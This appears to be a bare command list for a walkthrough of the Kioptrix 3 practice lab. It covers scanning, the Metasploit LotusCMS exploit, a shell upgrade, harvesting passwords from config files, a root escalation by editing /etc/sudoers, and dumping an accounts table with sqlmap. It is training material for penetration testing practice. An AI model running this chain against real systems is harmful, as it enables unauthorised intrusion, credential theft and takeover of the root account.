Commands:

netdiscover -i eth1

nmap -p- -A (Kioptrix 3 IP)

dirb http://(Kioptrix 3 IP)

use exploit/multi/http/lcms_php_exec
set RHOSTS (Kioptrix 3 IP)
set URI /index.php?system=Admin
run
shell
python -c 'import pty; pty.spawn("/bin/bash")'

cat /etc/passwd

cd /home
cd loneferret
ls -lah
cat CompanyPolicy.README

find / -maxdepth 5 -name *.php -type f -exec grep -Hn password {} \; 2>/dev/null

cd /home/www/kioptrix3.com/gallery

cat gconfig.php 

http://(KIOPTRIX 3 IP)/phpmyadmin/

su loneferret

ssh loneferret@(KIOPTRIX 3 IP)

export TERM=xterm

sudo ht

Alt=F
/etc/sudoers

sudo /bin/sh

vi /etc/hosts

sqlmap -r sqli --risk=3 --level=5 -D gallery --tables --batch

sqlmap -r sqli --risk=3 --level=5 -D gallery -T dev_accounts --dump --batch


URLs:

https://www.rapid7.com/db/modules/exploit/multi/http/lcms_php_exec